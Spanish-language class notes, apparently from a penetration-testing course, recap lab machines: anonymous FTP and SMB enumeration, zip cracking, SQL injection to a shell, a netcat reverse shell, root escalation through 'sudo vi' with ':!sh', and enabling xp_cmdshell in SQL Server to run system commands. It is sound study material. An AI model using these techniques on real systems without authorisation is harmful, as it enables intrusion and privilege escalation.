## ① Crocodile — Repaso rápido

### Flujo de la máquina

1. **FTP Anonymous** → Descargar `backup.zip`
2. **zip2john + John** → Crackear contraseña
3. **Descomprimir** → Encontrar hash MD5 en `index.php`
4. **CrackStation** → Obtener contraseña `password789`
5. **Login en web** → `admin` / `password789`
6. **SQLMap** → SQL Injection → os-shell
7. **Reverse shell** → Conexión por netcat
8. **Escalada** → SSH con credenciales reutilizadas

## ② Escalada de privilegios con VI + sudo

### Verificar sudo

```bash
sudo -l
```

**Resultado:**
```
User can run as: ALL
Allowed commands: /usr/bin/vi /etc/postgresql/11/main/pg_hba.conf
```

> [!important] VI como vector de escalada
> El usuario `pogres` puede ejecutar VI como **cualquier usuario** (incluido root). VI no es solo un editor: tiene un modo que permite ejecutar comandos del sistema.

### Ejecutar VI como root

```bash
sudo vi /etc/postgresql/11/main/pg_hba.conf
```

### Dentro de VI, lanzar shell

```
:!sh
```

**Resultado:** Shell como root.

> [!important] GTFOBins
> Siempre consultar `gtfobins.github.io` para ver cómo explotar binarios con sudo. Cada binario tiene sus propios métodos.

## ③ Concepto nuevo: SMB (Server Message Block)

### Qué es SMB

SMB es un protocolo para **compartir archivos e impresoras** en red. El puerto es el **445**.

### Herramientas principales

| Herramienta | Función |
|---|---|
| `smbclient` | Conectarse a comparticiones SMB |
| `smbmap` | Enumerar comparticiones y permisos |

### Conexión anónima

```bash
smbclient -N //IP/IPC$
smbclient -N //IP/Backups
```

### Descargar archivos

```bash
smb: \> ls
smb: \> get archivo.txt
smb: \> exit
```

> [!important] SMB siempre hay que enumerarlo
> Muchas veces hay archivos de configuración con contraseñas. Si ves un puerto 445 abierto, siempre revisa las comparticiones.

## ④ Concepto nuevo: SQL Server con Impacket

### Qué es Impacket

Impacket es una colección de herramientas en Python para trabajar con protocolos de red. Para SQL Server, se usa `mssqlclient`.

### Conexión

```bash
mssqlclient.py 'USUARIO:CONTRASEÑA@IP'
```

### Verificar permisos de administrador

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Si devuelve `1`, tienes permisos de administrador.

### Activar XP_CMDShell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Ejecutar comandos

```sql
EXEC xp_cmdshell 'whoami';
```

> [!important] XP_CMDShell
> XP_CMDShell permite ejecutar comandos del sistema operativo a través de SQL Server. Solo funciona si tienes permisos de administrador en SQL.

## ⑤ Concepto nuevo: Escalada en Windows con SMB + SQL

### Flujo completo

1. **SMB Anonymous** → Enumerar comparticiones
2. **Encontrar credenciales** en archivo de configuración
3. **Conectar por SQL Server** con Impacket
4. **Verificar permisos** de administrador
5. **Activar XP_CMDShell**
6. **Ejecutar comandos** como system

## ⑥ Notas de clase

- **VI es peligroso con sudo**: Siempre consultar GTFOBins.
- **SMB**: Puerto 445. Siempre enumerar comparticiones anónimas.
- **Impacket**: Herramienta imprescindible para SQL Server.
- **XP_CMDShell**: Permite ejecutar comandos del SO a través de SQL.
- **Credenciales en archivos de configuración**: Siempre buscar archivos que terminen en `.conf`, `.config`, `.ini`.
- **Reutilización de contraseñas**: La contraseña de SMB puede funcionar para SQL Server.
